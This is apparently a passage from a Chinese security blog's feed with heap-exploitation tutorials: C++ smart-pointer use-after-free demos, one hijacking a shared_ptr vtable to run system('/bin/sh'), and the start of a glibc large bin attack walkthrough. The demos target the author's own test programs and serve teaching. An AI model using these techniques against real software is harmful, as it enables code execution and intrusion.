#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">size_t</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>

    <span class="c1">// 出于某些原因, 两个智能指针指向了同一个chunk</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="c1">// 以及出于另外的某些原因, 其中一个先于另一个调用了.reset()</span>
    <span class="n">ptr1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="c1">// 此时就有了UAF</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr2</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>
    
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;*</span><span class="n">ptr_new</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="c1">// 另外, 在此之后, ptr2和ptr_new都需要析构, 会造成double free</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果打印">   结果打印</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./test
1919810
free(): double free detected in tcache 2
[1]    65769 IOT instruction (core dumped)  ./test
</code></pre></div></div> <h2 id="比较和综合利用">比较和综合利用</h2> <h5 id="由于shared_ptr或者weak_ptr绑定的内存布局的设计-导致虚表和两个count在get或者operator取得的裸指针的低位-实际上是不容易被篡改的-所以shared_ptr或者weak_ptr的uaf需要比较严重的漏洞-这导致之前篡改两个count时显得非常刻意-取了裸指针-还用了强制类型转换和负偏移">   由于<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>绑定的内存布局的设计, 导致虚表和两个count在<code class="language-plaintext highlighter-rouge">.get()</code>或者<code class="language-plaintext highlighter-rouge">operator*()</code>取得的裸指针的低位, 实际上是不容易被篡改的 ,所以<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>的UAF需要比较严重的漏洞, 这导致之前篡改两个count时显得非常刻意: 取了裸指针, 还用了强制类型转换和负偏移.<br/></h5> <h5 id="而此处unique_ptr的漏洞-就是说unique_ptr对象和内存依然没有一一对应-分配的内存先于智能指针对象出现-导致它被多个指针持有-概括性的总结-就是没有从头到尾使用智能指针管理内存-以及裸指针使用不当导致的">   而此处<code class="language-plaintext highlighter-rouge">unique_ptr</code>的漏洞, 就是说<code class="language-plaintext highlighter-rouge">unique_ptr</code>对象和内存依然没有一一对应, 分配的内存先于智能指针对象出现, 导致它被多个指针持有. 概括性的总结, 就是没有从头到尾使用智能指针管理内存, 以及裸指针使用不当导致的<br/></h5> <h5 id="相较而言-后者漏洞更容易出现-尤其是在某些裸指针和智能指针并存的情况之下">   相较而言, 后者漏洞更容易出现, 尤其是在某些裸指针和智能指针并存的情况之下<br/></h5> <h5 id="其次-这里示例的unique_ptr的uaf实际上更加类似于c中的uaf">   其次, 这里示例的<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF实际上更加类似于C中的UAF.</h5> <h5 id="前面提到shared_ptr和weak_ptr其实只能修改一个chunk的一部分-chunk释放之后的fd或bk将无法修改仅有uaf时">   前面提到<code class="language-plaintext highlighter-rouge">shared_ptr</code>和<code class="language-plaintext highlighter-rouge">weak_ptr</code>其实只能修改一个<code class="language-plaintext highlighter-rouge">chunk</code>的一部分, <code class="language-plaintext highlighter-rouge">chunk</code>释放之后的<code class="language-plaintext highlighter-rouge">fd</code>或<code class="language-plaintext highlighter-rouge">bk</code>将无法修改(仅有UAF时)<br/></h5> <h5 id="而unique_ptr的uaf可以修改chunk中所有的内容-结合另外两种智能指针-一方面可以用于篡改两个counts-另一方面能够劫持虚表感觉这个更有用">   而<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF可以修改<code class="language-plaintext highlighter-rouge">chunk</code>中所有的内容, 结合另外两种智能指针, 一方面可以用于篡改两个counts, 另一方面能够劫持虚表(感觉这个更有用)<br/></h5> <h5 id="下面是第一个demo-用unique_ptr的uaf改shared空间的counts导致chunk提前释放-得到shared_ptr的uaf">   下面是第一个demo, 用<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF改shared空间的counts导致<code class="language-plaintext highlighter-rouge">chunk</code>提前释放, 得到<code class="language-plaintext highlighter-rouge">shared_ptr</code>的UAF</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">TQWord</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">QWord_1</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_2</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_3</span><span class="p">;</span>
    
    <span class="n">TQWord</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">_a</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">_b</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">_c</span><span class="p">)</span><span class="o">:</span> <span class="n">QWord_1</span><span class="p">(</span><span class="n">_a</span><span class="p">),</span> <span class="n">QWord_2</span><span class="p">(</span><span class="n">_b</span><span class="p">),</span> <span class="n">QWord_3</span><span class="p">(</span><span class="n">_c</span><span class="p">){}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="n">TQWord</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TQWord</span><span class="p">({</span><span class="mh">0x12345678</span><span class="p">,</span> <span class="mh">0x87654321</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">});</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="n">unique_ptr_1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">shared_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">shared_ptr</span><span class="p">;</span>
        <span class="n">unique_ptr_2</span><span class="o">-&gt;</span><span class="n">QWord_2</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span> <span class="c1">// UAF</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114</span><span class="p">,</span> <span class="mi">514</span><span class="p">,</span> <span class="mi">1919810</span><span class="p">);</span>
    <span class="o">*</span><span class="n">shared_ptr</span> <span class="o">=</span> <span class="mi">114514</span><span class="p">;</span> <span class="c1">// UAF</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">unique_ptr_new</span><span class="o">-&gt;</span><span class="n">QWord_3</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果当然是不出意外地打印了1919810">   结果当然是不出意外地打印了<code class="language-plaintext highlighter-rouge">1919810</code><br/></h5> <h5 id="第二个-unique_ptr的uaf劫持shared_ptr的虚表-执行system">   第二个, <code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF劫持<code class="language-plaintext highlighter-rouge">shared_ptr</code>的虚表, 执行<code class="language-plaintext highlighter-rouge">system(...)</code><br/></h5> <h5 id="劫持之前-来点分析-一个demo的demo-这里编译时-no-pie便于调试">   劫持之前, 来点分析, 一个demo的demo, 这里编译时<code class="language-plaintext highlighter-rouge">-no-pie</code>便于调试<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="shared_ptr的虚表在0x403d38-有5个函数指针">   <code class="language-plaintext highlighter-rouge">shared_ptr</code>的虚表在<code class="language-plaintext highlighter-rouge">0x403d38</code>, 有5个函数指针</h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d4f168d32.png" alt="Screenshot 2025-02-06 233307.png"/></p> <h5 id="可以去搞清楚它们各自是干什么的-但这里我选择直接打5个断点-挨个看rdi">   可以去搞清楚它们各自是干什么的, 但这里我选择直接打5个断点, 挨个看<code class="language-plaintext highlighter-rouge">rdi</code><br/></h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d6bed1e0a.png" alt="Screenshot 2025-02-06 233813.png"/></p> <h5 id="到达第一处中断-是虚表的第三个指针_m_dispose-rdi是虚表指针堆上那个-大致这样式的">   到达第一处中断, 是虚表的第三个指针<code class="language-plaintext highlighter-rouge">::_M_dispose()</code>, <code class="language-plaintext highlighter-rouge">rdi</code>是虚表指针(堆上那个), 大致这样式的<br/></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*RDI  0x4172b0 —▸ 0x403d38 (vtable for std::_Sp_counted_ptr_inplace&lt;unsigned long, std::allocator&lt;void&gt;, (__gnu_cxx::_Lock_policy)2&gt;+16) —▸ 0x401c7e (std::_Sp_counted_ptr_inplace&lt;unsigned long, std::allocator&lt;void&gt;, (__gnu_cxx::_Lock_policy)2&gt;::~_Sp_counted_ptr_inplace()) ◂— endbr64
</code></pre></div></div> <h5 id="与此同时-frame-5是main71-如下图-说明现在在析构中-构造函数似乎没用到虚表函数">   与此同时, <code class="language-plaintext highlighter-rouge">frame 5</code>是<code class="language-plaintext highlighter-rouge">main+71</code>, 如下图, 说明现在在析构中, 构造函数似乎没用到虚表函数<br/></h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d7bba731d.png" alt="Screenshot 2025-02-06 234119.png"/></p> <h5 id="到这里就够了-可以申请一个3--8的空间-第一个字长填上binshx00或者别的什么指令的地址-第三个字长填后门函数或者直接是system的地址">   到这里就够了, 可以申请一个<code class="language-plaintext highlighter-rouge">3 * 8</code>的空间, 第一个字长填上<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>或者别的什么指令的地址, 第三个字长填后门函数或者直接是<code class="language-plaintext highlighter-rouge">system()</code>的地址<br/></h5> <h5 id="demo登场">   demo登场</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">TQWord</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">QWord_1</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_2</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_3</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">unreachable</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">**</span> <span class="n">command</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="o">*</span><span class="n">command</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">size_t</span> <span class="n">cmd</span> <span class="o">=</span> <span class="mh">0x0068732f6e69622f</span><span class="p">;</span> <span class="c1">// b"/bin/sh"</span>

<span class="n">TQWord</span> <span class="n">fakeVtable</span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unreachable</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="n">TQWord</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TQWord</span><span class="p">{</span><span class="mi">114</span><span class="p">,</span> <span class="mi">514</span><span class="p">,</span> <span class="mi">1919810</span><span class="p">};</span>

    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="n">unique_ptr_1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">shared_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">1919810</span><span class="p">);</span>
    <span class="n">unique_ptr_2</span><span class="o">-&gt;</span><span class="n">QWord_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fakeVtable</span><span class="p">;</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/07/67a4e27910ad2.png" alt="Screenshot 2025-02-07 003143.png"/></p> <h5 id="这么个写法还是美中不足-虚表函数的第一个参数rdi都是虚表指针或者说地址-导致按照上述的写法-传给unreachable是cmd-需要一次解引用">   这么个写法还是美中不足, 虚表函数的第一个参数(<code class="language-plaintext highlighter-rouge">rdi</code>)都是虚表指针(或者说地址), 导致按照上述的写法, 传给<code class="language-plaintext highlighter-rouge">unreachable</code>是<code class="language-plaintext highlighter-rouge">&amp;&amp;cmd</code>, 需要一次解引用<br/></h5> <h5 id="但是话又说回来-如果虚表地址填上cmd-确实不用解引用-但是没法虚表劫持了">   但是话又说回来, 如果虚表地址填上<code class="language-plaintext highlighter-rouge">cmd</code>, 确实不用解引用, 但是没法虚表劫持了<br/></h5> <h5 id="于是想到不用system-可以发现rsi指向的是shared_ptr指向的数据区域-这一部分是可控的">   于是想到不用<code class="language-plaintext highlighter-rouge">system()</code>, 可以发现<code class="language-plaintext highlighter-rouge">rsi</code>指向的是<code class="language-plaintext highlighter-rouge">shared_ptr</code>指向的数据区域, 这一部分是可控的</h5> <p><img src="https://www.helloimg.com/i/2025/02/07/67a5b70cb4242.png" alt="Screenshot 2025-02-07 120625.png"/></p> <h5 id="于是-想到把数据改成binshx00-这样就有一个const-char的参数-然后后门函数方面选择posix_spawn-下面是参数表-可以看到它的第二个参数是path">   于是, 想到把数据改成<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>, 这样就有一个<code class="language-plaintext highlighter-rouge">const char*</code>的参数, 然后后门函数方面选择<code class="language-plaintext highlighter-rouge">posix_spawn</code>, 下面是参数表, 可以看到它的第二个参数是<code class="language-plaintext highlighter-rouge">path</code></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">posix_spawn</span><span class="p">(</span><span class="n">pid_t</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">pid</span><span class="p">,</span> 
                <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">path</span><span class="p">,</span>
                <span class="k">const</span> <span class="n">posix_spawn_file_actions_t</span> <span class="o">*</span><span class="n">file_actions</span><span class="p">,</span>
                <span class="k">const</span> <span class="n">posix_spawnattr_t</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">attrp</span><span class="p">,</span>
                <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[</span><span class="k">restrict</span><span class="p">],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[</span><span class="k">restrict</span><span class="p">]);</span>
</code></pre></div></div> <h5 id="但是还是有问题-函数本身对file_actions有检查-rdx为nullptr可以绕过检查-但调用这几个虚表函数时rdx都不是nullptr-出现以下perror">   但是还是有问题, 函数本身对<code class="language-plaintext highlighter-rouge">file_actions</code>有检查, <code class="language-plaintext highlighter-rouge">rdx</code>为nullptr可以绕过检查, 但调用这几个虚表函数时<code class="language-plaintext highlighter-rouge">rdx</code>都不是nullptr, 出现以下<code class="language-plaintext highlighter-rouge">perror</code></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>posix_spawn failed: Bad file descriptor
</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="pwn"/><category term="水"/><summary type="html"><![CDATA[ps1: UAF方法不全面, 没写不代表不能用或者没有 ps2: 尽量避免裸指针出现, 只在模拟漏洞(各种任意写)时使用裸指针达到目的, 也就是非必要不用.get()]]></summary></entry><entry><title type="html">large bin attack及house of cat</title><link href="https://leakbox258.github.io/blog/2024/largebin-attack-%E4%BB%A5%E5%8F%8A-IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)/" rel="alternate" type="text/html" title="large bin attack及house of cat"/><published>2024-12-12T00:00:00+00:00</published><updated>2024-12-12T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/largebin%20attack%20%E4%BB%A5%E5%8F%8A%20IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/largebin-attack-%E4%BB%A5%E5%8F%8A-IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)/"><![CDATA[<p> <del>好不容易学点东西赶紧记下来, 不然过几天又忘记了</del></p> <h3 id="前情提要">前情提要:<br/></h3> <h5 id="1-由于glibc-234开始-去掉了常用的各种hook-包括__malloc_hook-__free_hook-__exit_hook等-标志了一个时代的落幕-从此之后-在没有什么特别的backdoor的情况下-仅仅使用tcachebin-unsortedbin-fastbin等的攻击很难达到劫持执行流的目的-所以这些方法现在更多是作为一个泄露偏移的存在">   1. 由于glibc 2.34开始, 去掉了常用的各种hook, 包括__malloc_hook, __free_hook, __exit_hook等, 标志了一个时代的落幕. 从此之后, 在没有什么特别的backdoor的情况下, 仅仅使用tcachebin, unsortedbin, fastbin等的攻击很难达到劫持执行流的目的, 所以这些方法现在更多是作为一个泄露偏移的存在<br/></h5> <h5 id="2-失去了hook不代表堆题就没法劫持控制流了不然还玩个蛋-还可以寻找其他劫持的方法-劫持方法需要满足-泛用性-即大多数的情况下都存在的利用方法-简易性-在较少的漏洞利用的情况下就可以实现">   2. 失去了hook不代表堆题就没法劫持控制流了(<del>不然还玩个蛋</del>), 还可以寻找其他劫持的方法. 劫持方法需要满足: 泛用性, 即大多数的情况下都存在的利用方法; 简易性, 在较少的漏洞利用的情况下就可以实现<br/></h5> <h5 id="3-在现有的诸多劫持方法中-可以总结出一些经验-就是-largebinattack--某种house-其中largebinattack手法用于预备一个rop或者别的什么-以及伪造一个io_file_plus结构体-然后由某种手法将控制流交给rop">   3. 在现有的诸多劫持方法中, 可以总结出一些经验, 就是 largebinAttack + 某种house. 其中largebinAttack手法用于预备一个ROP(或者别的什么), 以及伪造一个IO_FILE_PLUS结构体, 然后由某种手法将控制流交给ROP</h5> <h3 id="年轻人的第一个largebin-attack">年轻人的第一个largebin attack</h3> <h5 id="对于一个chunk-当被free的时候-如果大小小于tcachebin的上限的话-被放进对应的tcachebin内-如果大于的话-会被放到unsorted-bin内-显然-我们现在讨论后者">   对于一个chunk, 当被free的时候, 如果大小小于tcachebin的上限的话, 被放进对应的tcachebin内, 如果大于的话, 会被放到unsorted bin内. 显然, 我们现在讨论后者.<br/></h5> <h5 id="-放进unsorted-bin的大chunk-会在下一次malloc时被决定自己的命运-当malloc无法在tcache和fastbin内找到合适的chunk当前bins中的chunk都太小-它会遍历unsorted-bin">    放进unsorted bin的大chunk, 会在下一次malloc时被决定自己的命运. 当malloc无法在tcache和fastbin内找到合适的chunk(当前bins中的chunk都太小), 它会遍历unsorted bin<br/></h5> <h5 id="-假如malloc依然无法找到-同时目标的large-bin没有和附近的free-chunk或者是top-chunk合并-那么它就会被原封不动的放到一个large-bin内">    假如malloc依然无法找到, 同时目标的large bin没有和附近的free chunk或者是top chunk合并, 那么它就会被原封不动的放到一个large bin内<br/></h5> <h5 id="largebin具有和其他的bins不同的构造-对于比较小的chunk-每个chunk-size都相对常用-所以都有对应的bin-但是large-chunk本身就不常用-具体落到每个chunk-size更少-所以glibc做法是一定chunk-size内划分一个bin-如图">   largebin具有和其他的bins不同的构造, 对于比较小的chunk, 每个chunk size都相对常用, 所以都有对应的bin. 但是large chunk本身就不常用, 具体落到每个chunk size更少, 所以glibc做法是一定chunk size内划分一个bin, 如图</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x390</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675a8d7e437fb.png" alt="Screenshot 2024-12-12 151434.png"/></p> <h5 id="上面一行0x4000x430虽然是这么写-但实际上只有chunksize--0x420-也即malloc0x410以上才会放到largebin">   上面一行<code class="language-plaintext highlighter-rouge">0x400~0x430</code>虽然是这么写, 但实际上只有chunksize &gt; 0x420, 也即<code class="language-plaintext highlighter-rouge">malloc(0x410)</code>以上才会放到largebin<br/></h5> <h5 id="一个largebin内chunksize是非升序排列的-也就是从大到小的趋势-图中从左向右-main_arena作为链表的尾--大小相同的紧挨着">   一个largebin内chunksize是非升序排列的, 也就是从大到小的趋势 (图中从左向右, main_arena作为链表的尾) , 大小相同的紧挨着<br/></h5> <h5 id="largebin-chunk内部的存放有管理这个链表的信息-fd-bk-fd_nextsize-bk_nextsize-fd-bk和其他bin没有区别-连接着该bin中的所有chunk-以及该bin所对应的main_arena">   largebin chunk内部的存放有管理这个链表的信息, <code class="language-plaintext highlighter-rouge">fd, bk, fd_nextsize, bk_nextsize</code>, <code class="language-plaintext highlighter-rouge">fd, bk</code>和其他bin没有区别, 连接着该bin中的所有chunk, 以及该bin所对应的<code class="language-plaintext highlighter-rouge">main_arena</code><br/></h5> <h5 id="再看一个码-大概意思就是一个chunksize有两个-一个bin内一共6个">   再看一个码, 大概意思就是一个chunksize有两个, 一个bin内一共6个</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

